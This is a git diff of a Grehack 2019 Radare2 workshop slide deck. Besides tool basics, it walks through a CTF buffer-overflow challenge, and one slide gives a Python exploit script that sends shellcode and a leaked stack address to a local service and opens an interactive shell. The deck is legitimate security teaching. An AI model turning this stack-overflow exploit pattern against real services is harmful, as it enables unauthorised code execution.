@@ -3,6 +3,7 @@
   <head>
     <title>Radare2</title>
     <meta charset="utf-8">
+		<!--
     <style>
 		@font-face {
 			font-family: 'Barrio';
@@ -12,7 +13,7 @@
 		}
 
 		h1 { font-family: Barrio; }
-		h1:before, h2:before, h3:before {
+		h1:before /*, h2:before, h3:before */ {
 			content: '» ';
 			color: #f0082d;
 		}
@@ -89,24 +90,257 @@
 			float: right;
 		}
     </style>
+	-->
   </head>
   <body>
     <textarea id="source">
-name: inverse
-layout: true
-class: middle
 ---
-.left-column[
-# Radare2
-No money to buy IDA?<br>
-No java to run Ghidra?<br>
-No time to write Binary Ninja plugins to make it useful?<br>
-Failed to get a seat at the miasm workshop?<br>
-]
+class: middle, center
 
-.right-column[
-<img src="./r2.png" alt="snuffy" height="100" style="padding-top:100px">
-]
+# Workshop Radare2
+
+<img src="./r2.png" alt="snuffy" height="100" style="margin:auto;">
+
+## Grehack 2019
+
+---
+class: left, top
+
+# Radare2 workshop!
+
+- No money to buy IDA?<br>
+- No java to run Ghidra?<br>
+- No time to write Binary Ninja plugins to make it useful?<br>
+- Failed to get a seat at the [miasm](https://grehack.fr/2019/workshops#miasm) workshop?<br>
+
+Welcome to radare2!
+
+---
+
+# Agenda
+
+1. What is this radare2 thing?
+1. How do I radare2?
+2. How do I impress my CTF pals with it?
+3. How can I get r2 swag?
+
+---
+
+# Who are we?
+
+### Julien (jvoisin) Voisin
+- dustri.org
+
+### Simon (smagnin) Magnin
+- smagnin.org
+
+
+---
+
+# What is this radare2 thing?
+
+### It's like vim in Dwarf Fortress, right?
+
+---
+
+# What is radare2?
+
+- Reverse engineering *framework*
+- Open-sauce
+- Extensible
+- Command-line
+
+---
+
+
+# How do I radare2?
+
+### What do you mean "command line"?!
+
+---
+
+# Commands
+
+- Every character has a purpose/meaning
+	- `p` → `p`rint
+	- `d` → `d`isassemble
+- Combine them to form commands
+	- `pd` → `print` + `disassemble`
+- Everything is documented with `?`
+	- `pd?`
+	- recursive help via `?*`
+
+
+---
+
+# Commands (ex.)
+
+- How do you print a hexdump?
+- How do you analyze and opcode?
+- XXX
+
+---
+
+# How do I impress my CTF 🏴 pals with it?
+
+### Excellent, we can attack in any direction!
+
+---
+
+# Pop Quizz
+
+♪ Put your hands in the air if you know about ♫
+
+- Exploitation
+- Buffer overflows
+- ROP chains
+- Mitigations
+- CTF
+
+
+---
+
+# Sushi — BSides Vancouver CTF 2015
+
+XXX: logo
+
+- Cool CTF, organised by nice people
+- Super-easy challenge
+
+---
+
+# Recon and mitigations
+
+```nasm
+$ r2 ./sushi-a6cbcb6...98cb4f98c8
+[0x004004a0]> i~format
+[0x004004a0]> i~nx
+[0x004004a0]> i~pic
+[0x004004a0]> i~canary
+```
+
+---
+
+# How to run the binary?
+
+Use rarun:
+
+```
+$ rarun2 program=./sushi-a6cbc...4f98c8 listen=4444
+$ rarun2 -h
+```
+
+---
+
+# Reversing (ex.)
+
+```nasm
+[0x004004a0]> aa
+[0x004004a0]> pdf
+[0x004004a0]> s main
+[0x004004a0]> pdf
+```
+
+What is the main function doing?
+
+---
+
+# The main function
+
+```c
+int main(int argc, char** argv) {
+  char local_40[0x40];
+  printf(“Deposit money for sushi here:     %p\n”, local_40);
+  fflush(stdout);
+  gets(local_40):
+  printf(“Sorry, $0.%d is not enough.\n”, local_40);
+  fflush(stdout);
+  return 0
+}
+
+```
+
+---
+
+# Getting RIP control (ex.)
+
+```
+$ ragg2 -P 128 -r
+$ r2 -d ./sushi-a6cbc...8cb4f98c8
+[0x7fd1f7ebc090]> dc
+[0x004005f2]> dr=
+[0x004005f2]> pd 1 @ rip
+[0x004005f2]> pxW 4 @ rsp
+[0x004005f2]> woO `pxW 4 @ rsp~[1]`
+```
+
+---
+
+# Writing an exploit (ex.)
+
+Our payload will look like this:
+```
+shellcode | ‘A’* (72 - len(shellcode)) | buffer_addr
+```
+```
+$ ragg2 -z -i exec
+```
+
+Can you build a working exploit?
+Writeup in `MIN(~15 minutes, first shell)`
+
+---
+
+# Exploit
+
+```python
+import socket, struct, re
+
+def rop(*args):  # 'Q' and not 'I' for x64
+    return struct.pack('Q'*len(args), *args)
+
+shellcode = "\x31...\x05"
+s = socket.create_connection(('127.0.0.1', 4444))
+buffer_addr = re.search('^Deposit money for sushi   here: (.+)$', s.recv(1024)).group(1)
+buffer_addr = int(buffer_addr, 16)
+
+s.send(shellcode + 'A'*(72 - len(shellcode)) + rop(buffer_addr) + '\n')
+s.recv(1024)
+
+while(True):
+    s.send(raw_input('$ ') + '\n')
+    print(s.recv(1024))
+```
+
+---
+
+# r0pbaby
+
+- Defcon 2015 Quals
+- Easy ROP pwn
+
+---
+
+TODO(jvoisin)
+
+---
+
+# How can I get r2 swag?
+
+### How much did you say for the radare2 plumbus?
+
+---
+
+# 
+
+---
+
+# Documentations and friendly neighbours
+
+
+- The [r2book](https://radare.gitbooks.io/radare2book/content)
+- [IRC](irc://irc.freenode.net/radare)/[Telegram](https://telegram.me/joinchat/ACR-FkEK2owJSzMUYjt_NQ)/…
+- The [r2con]( https://www.radare.org/con/ )
 
 ---
 
@@ -115,8 +349,9 @@ Failed to get a seat at the miasm workshop?<br>
  - Xarkes for inviting us!
  
 ---
-background-image: url(end.jpg)
-background-size: cover
+background-position: center;
+background-size: contain;
+background-image: url(clippy.png)
 
    </textarea>
     <script src="./remark-latest.min.js"></script>
